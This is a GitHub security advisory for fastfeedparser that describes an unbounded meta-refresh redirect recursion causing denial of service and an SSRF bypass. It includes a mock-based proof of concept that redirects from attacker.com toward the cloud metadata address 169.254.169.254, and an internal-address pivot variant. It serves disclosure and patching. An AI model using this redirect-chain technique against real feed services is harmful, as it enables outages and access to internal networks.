# [H] FastFeedParser has an infinite redirect loop DoS via meta-refresh chain

## Summary
Severity: High
Advisory: GHSA-4gx2-pc4f-wq37
CVE: CVE-2026-39376
CWE: CWE-400, CWE-674
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-04-08
Source: https://github.com/advisories/GHSA-4gx2-pc4f-wq37
Type: github-advisory

## Affected
- PyPI: `fastfeedparser` — affected >=0 <0.5.10

## Details
### Summary
When `parse()` fetches a URL that returns an HTML page containing a `<meta http-equiv="refresh">` tag, it recursively calls itself with the redirect URL — with no depth limit, no visited-URL deduplication, and no redirect count cap. An attacker-controlled server that returns an infinite chain of HTML meta-refresh responses causes unbounded recursion, exhausting the Python call stack and crashing the process. This vulnerability can also be chained with the companion SSRF issue to reach internal network targets after bypassing the initial URL check.


### Details
`parse()` catches `ValueError` on XML parse failure, extracts a meta-refresh URL from the HTML response via `_extract_meta_refresh_url()`, and tail-calls itself with that URL. The recursive call is unconditional — there is no maximum redirect depth, no set of already-visited URLs, and no guard against self-referential or looping redirects.

**`fastfeedparser/main.py` — `parse()` (recursive sink):**
```python
def parse(source: str | bytes, ...) -> FastFeedParserDict:
    is_url = isinstance(source, str) and source.startswith(("http://", "https://"))
    if is_url:
        content = _fetch_url_content(source)
    try:
        return _parse_content(content, ...)
    except ValueError as e:
        ...
        redirect_url = _extract_meta_refresh_url(content, source)
        if redirect_url is None:
            raise
        return parse(redirect_url, ...)   # ← unconditional recursion, no depth limit
```

`_extract_meta_refresh_url()` uses `urljoin(base_url, match.group(1))` so relative, protocol-relative (`//host/path`), and absolute URLs in the `content=` attribute are all followed.

### PoC
No live server required. The following monkeypatches `_fetch_url_content` to return an infinite HTML meta-refresh chain and confirms unbounded recursion:

```python
import fastfeedparser.main as m

call_count = 0
_orig = m._fetch_url_content

def mock_fetch(url):
    global call_count
    call_count += 1
    if call_count > 10:
        raise RuntimeError(f"Stopped at call {call_count}")
    next_url = f"http://169.254.169.254/step{call_count}/"
    return f"""<html><head>
<meta http-equiv="refresh" content="0; url={next_url}">
</head><body>not a feed</body></html>""".encode()

m._fetch_url_content = mock_fetch

try:
    m.parse("http://attacker.com/loop")
except RuntimeError as e:
    print(f"CONFIRMED infinite loop: {e}")
finally:
    m._fetch_url_content = _orig
    print(f"Total fetches before stop: {call_count}")

# Output:
# CONFIRMED infinite loop: Stopped at call 11
# Total fetches before stop: 11
```

Each recursive call performs a real HTTP request (30 s timeout), HTML parsing, and a Python stack frame allocation. With Python's default recursion limit of 1000 and a 30 s per-request timeout, a single attacker request can hold a server thread busy for up to ~8 hours before a `RecursionError` is raised.

**SSRF chain variant:** The first response can be legitimate HTML redirecting to an internal address (`http://192.168.1.1/`), letting the redirect loop also serve as an SSRF bypass for targets that would otherwise be blocked by application-level URL validation applied only to the initial URL.



### Impact
This is a denial-of-service vulnerability with a secondary SSRF-chaining impact. Any application that accepts user-supplied feed URLs and calls `fastfeedparser.parse()` is affected — including RSS aggregators, feed preview services, and "subscribe by URL" features. An attacker with no authentication can:

- Hold a server worker thread indefinitely (one request per attacker connection)
- Crash the worker process via `RecursionError` after ~1000 redirects
- Use the redirect chain to pivot SSRF requests to internal network targets

## References
- https://github.com/kagisearch/fastfeedparser/security/advisories/GHSA-4gx2-pc4f-wq37
- https://nvd.nist.gov/vuln/detail/CVE-2026-39376
- https://github.com/kagisearch/fastfeedparser
- https://github.com/pypa/advisory-database/tree/main/vulns/fastfeedparser/PYSEC-2026-60.yaml
